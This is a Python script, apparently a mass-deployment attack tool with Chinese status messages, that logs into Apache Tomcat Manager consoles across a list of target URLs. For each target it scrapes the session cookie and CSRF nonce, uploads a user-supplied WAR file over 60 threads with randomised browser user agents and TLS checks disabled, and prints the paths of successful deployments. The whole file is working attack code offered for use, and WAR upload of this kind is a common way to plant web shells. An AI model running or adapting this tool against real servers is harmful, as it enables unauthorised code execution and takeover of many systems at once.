from sys import argv
from time import time
from re import findall
from queue import Queue
from random import randint
from threading import Thread
from urllib.parse import urlparse
from os.path import isfile, basename
from requests import get, post, urllib3


def Deploy(u, file):
    Header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10; rv:{0}.0) Gecko/20100101 Firefox/{0}.0'.format(randint(50, 88))}
    res = get(f'{u.scheme}://{u.netloc}' + '/manager/html', verify=False, timeout=10, allow_redirects=False, headers=Header)
    if res.status_code == 200 and '<small>Select WAR file to upload</small>' in res.text:
        Header['Cookie'] = res.headers['Set-Cookie'].split(';', 1)[0]
        CSRF = findall('\?org.apache.catalina.filters.CSRF_NONCE=.{32}', res.text)[0]
        FILE = {'deployWar': (basename(file), open(file, 'rb'), 'application/octet-stream')}
        res = post(f'{u.scheme}://{u.netloc}' + '/manager/html/upload' + CSRF, files=FILE, verify=False, timeout=10, allow_redirects=False, headers=Header)
        if res.status_code == 200 and f'/{basename(file).rstrip(".war")}/' in res.text:
            print(f'\033[92m[+] {u.scheme}://{u.hostname}:{u.port}/{basename(file).rstrip(".war")}\033[0m')

def RunTask(Task, Queues):
    while not Queues.empty():
        try:
            Deploy(Queues.get(), argv[2])
        except:
            pass
        finally:
            n = round(((Task-Queues.qsize())/Task)*100, 1)
            print(f"\033[96m[+] 当前进度: {n}%", end='\r')

def GetTask(arr):
    urllib3.disable_warnings()
    Task, Time, Queues = [0], time(), Queue()
    for url in arr:
        Queues.put(urlparse(url))
        Task[0] = Task[0]+1
    for i in range(60):
        Task.append(Thread(target=RunTask, args=(Task[0], Queues)))
        Task[-1].start()
    for t in Task[1:]:
        t.join()
    print(f"\033[96m[+] 部署完毕! 用时:{round(time()-Time, 1)}s\033[0m")

if __name__ == "__main__":
    try:
        if findall('https?://.+:.*@.+', argv[1]) and isfile(argv[2]):
            GetTask([argv[1]])
        elif isfile(argv[1]) and isfile(argv[2]):
            with open(argv[1], 'r') as file:
                GetTask(list(set(file.readlines())))
    except:
        print(f'\033[91m[-]\033[0m python3 {argv[0]} File War文件')
        print(f'\033[91m[-]\033[0m python3 {argv[0]} https://user:passwd@example.com War文件')